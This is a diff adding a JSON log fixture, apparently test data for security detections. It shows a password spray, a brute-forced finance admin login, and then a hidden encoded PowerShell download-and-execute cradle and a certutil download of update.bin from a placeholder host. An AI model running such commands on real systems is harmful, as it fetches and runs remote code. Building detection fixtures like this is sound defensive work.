@@ -1,0 +1,19 @@
+[
+  {"timestamp":"2026-08-10T21:00:00Z","event_id":"auth-001","event_type":"SignIn","outcome":"Failure","user":"alice@example.org","source_ip":"203.0.113.50","device":"LAPTOP-ALICE"},
+  {"timestamp":"2026-08-10T21:01:00Z","event_id":"auth-002","event_type":"SignIn","outcome":"Failure","user":"bob@example.org","source_ip":"203.0.113.50","device":"LAPTOP-BOB"},
+  {"timestamp":"2026-08-10T21:02:00Z","event_id":"auth-003","event_type":"SignIn","outcome":"Failure","user":"carol@example.org","source_ip":"203.0.113.50","device":"LAPTOP-CAROL"},
+  {"timestamp":"2026-08-10T21:03:00Z","event_id":"auth-004","event_type":"SignIn","outcome":"Failure","user":"david@example.org","source_ip":"203.0.113.50","device":"LAPTOP-DAVID"},
+  {"timestamp":"2026-08-10T21:04:00Z","event_id":"auth-005","event_type":"SignIn","outcome":"Failure","user":"erin@example.org","source_ip":"203.0.113.50","device":"LAPTOP-ERIN"},
+  {"timestamp":"2026-08-10T22:00:00Z","event_id":"auth-006","event_type":"SignIn","outcome":"Failure","user":"finance.admin@example.org","source_ip":"198.51.100.77","device":"FIN-WS-02"},
+  {"timestamp":"2026-08-10T22:00:40Z","event_id":"auth-007","event_type":"SignIn","outcome":"Failure","user":"finance.admin@example.org","source_ip":"198.51.100.77","device":"FIN-WS-02"},
+  {"timestamp":"2026-08-10T22:01:20Z","event_id":"auth-008","event_type":"SignIn","outcome":"Failure","user":"finance.admin@example.org","source_ip":"198.51.100.77","device":"FIN-WS-02"},
+  {"timestamp":"2026-08-10T22:02:00Z","event_id":"auth-009","event_type":"SignIn","outcome":"Failure","user":"finance.admin@example.org","source_ip":"198.51.100.77","device":"FIN-WS-02"},
+  {"timestamp":"2026-08-10T22:02:40Z","event_id":"auth-010","event_type":"SignIn","outcome":"Failure","user":"finance.admin@example.org","source_ip":"198.51.100.77","device":"FIN-WS-02"},
+  {"timestamp":"2026-08-10T22:03:20Z","event_id":"auth-011","event_type":"SignIn","outcome":"Failure","user":"finance.admin@example.org","source_ip":"198.51.100.77","device":"FIN-WS-02"},
+  {"timestamp":"2026-08-10T22:04:00Z","event_id":"auth-012","event_type":"SignIn","outcome":"Failure","user":"finance.admin@example.org","source_ip":"198.51.100.77","device":"FIN-WS-02"},
+  {"timestamp":"2026-08-10T22:04:40Z","event_id":"auth-013","event_type":"SignIn","outcome":"Failure","user":"finance.admin@example.org","source_ip":"198.51.100.77","device":"FIN-WS-02"},
+  {"timestamp":"2026-08-10T22:05:20Z","event_id":"auth-014","event_type":"SignIn","outcome":"Success","user":"finance.admin@example.org","source_ip":"198.51.100.77","device":"FIN-WS-02"},
+  {"timestamp":"2026-08-10T22:06:00Z","event_id":"proc-001","event_type":"ProcessCreated","user":"finance.admin@example.org","source_ip":"198.51.100.77","device":"FIN-WS-02","command_line":"powershell.exe -WindowStyle Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcA"},
+  {"timestamp":"2026-08-10T22:07:00Z","event_id":"proc-002","event_type":"ProcessCreated","user":"finance.admin@example.org","device":"FIN-WS-02","command_line":"certutil.exe -urlcache -split -f https://example.invalid/update.bin C:\\Users\\Public\\update.bin"},
+  {"timestamp":"2026-08-10T12:00:00Z","event_id":"proc-003","event_type":"ProcessCreated","user":"analyst@example.org","device":"SOC-WS-01","command_line":"notepad.exe C:\\Temp\\notes.txt"}
+]
